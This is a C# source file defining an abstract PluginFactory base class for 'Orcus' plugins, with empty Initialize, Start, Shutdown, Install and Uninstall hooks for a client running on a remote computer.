namespace Orcus.Plugins
{
    /// <summary>
    ///     The factory for a <see cref="FactoryCommand" />
    /// </summary>
    public abstract class PluginFactory : ILoadable
    {
        /// <summary>
        ///     Provides actions and information for the Orcus client
        /// </summary>
        protected IClientOperator ClientOperator { get; private set; }

        /// <summary>
        ///     Called directly after the plugin was loaded into Orcus to set the <see cref="ClientOperator" />
        /// </summary>
        /// <param name="clientOperator"></param>
        public virtual void Initialize(IClientOperator clientOperator)
        {
            ClientOperator = clientOperator;
        }

        /// <summary>
        ///     Called if the client is started on the remote computer
        /// </summary>
        public virtual void Start()
        {
        }

        /// <summary>
        ///     Called if the client shuts down on the remote computer
        /// </summary>
        public virtual void Shutdown()
        {
        }

        /// <summary>
        ///     Called if the client installation is finished
        /// </summary>
        /// <param name="executablePath">The path to the client</param>
        public virtual void Install(string executablePath)
        {
        }

        /// <summary>
        ///     Called if the plugin gets uninstalled
        /// </summary>
        /// <param name="executablePath">The path to the client</param>
        public virtual void Uninstall(string executablePath)
        {
        }
    }
}